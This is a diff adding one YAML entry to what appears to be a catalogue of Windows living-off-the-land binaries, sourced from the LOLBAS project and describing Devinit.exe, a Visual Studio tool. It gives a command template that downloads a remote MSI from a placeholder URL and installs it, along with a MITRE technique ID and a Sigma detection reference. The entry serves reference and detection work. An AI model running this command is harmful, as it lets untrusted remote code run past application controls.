@@ -1,0 +1,92 @@
+id: lolbas/T3RoZXJNU0JpbmFyaWVzL0RldmluaXQueW1s/RXhlY3V0ZQ/0
+type: binary
+platform: windows
+name: Devinit.exe
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1218.007
+opsec:
+  noise: high
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_devinit_lolbin_usage.yml
+commands:
+- template: devinit.exe run -t msi-install -i {REMOTEURL:.msi}
+  comment: Downloads an MSI file to C:\Windows\Installer and then installs it.
+references:
+- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Devinit/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: Devinit.exe
+      category: Execute
+      privileges: User
+      mitre_id: T1218.007
+      source_file: OtherMSBinaries/Devinit.yml
+      command_source_index: 0
+      document_utf8: "---\nName: Devinit.exe\nDescription: Visual Studio 2019 tool\nAuthor: mr.d0x\nCreated:\
+        \ 2022-01-20\nCommands:\n  - Command: devinit.exe run -t msi-install -i {REMOTEURL:.msi}\n   \
+        \ Description: Downloads an MSI file to C:\\Windows\\Installer and then installs it.\n    Usecase:\
+        \ Executes code from a (remote) MSI file.\n    Category: Execute\n    Privileges: User\n    MitreID:\
+        \ T1218.007\n    OperatingSystem: Windows 10, Windows 11\n    Tags:\n      - Execute: MSI\n  \
+        \    - Execute: Remote\nFull_Path:\n  - Path: C:\\Program Files\\Microsoft Visual Studio\\<version>\\\
+        Community\\Common7\\Tools\\devinit\\devinit.exe\n  - Path: C:\\Program Files (x86)\\Microsoft\
+        \ Visual Studio\\<version>\\Community\\Common7\\Tools\\devinit\\devinit.exe\nDetection:\n  - Sigma:\
+        \ https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_devinit_lolbin_usage.yml\n\
+        Resources:\n  - Link: https://twitter.com/mrd0x/status/1460815932402679809\nAcknowledgement:\n\
+        \  - Person: mr.d0x\n    Handle: '@mrd0x'\n"
+      document_sha256: sha256:adc51731e27418866589a985a5d00777b1a0c18740ea62765bb30fe338ef202f
+    upstream_url: https://lolbas-project.github.io/lolbas/OtherMSBinaries/Devinit/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1218.007
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:47b0af5c8fe86a3d563d1bddc4771ed5bbb16827a7d311f0053ba3cf9becb6f9
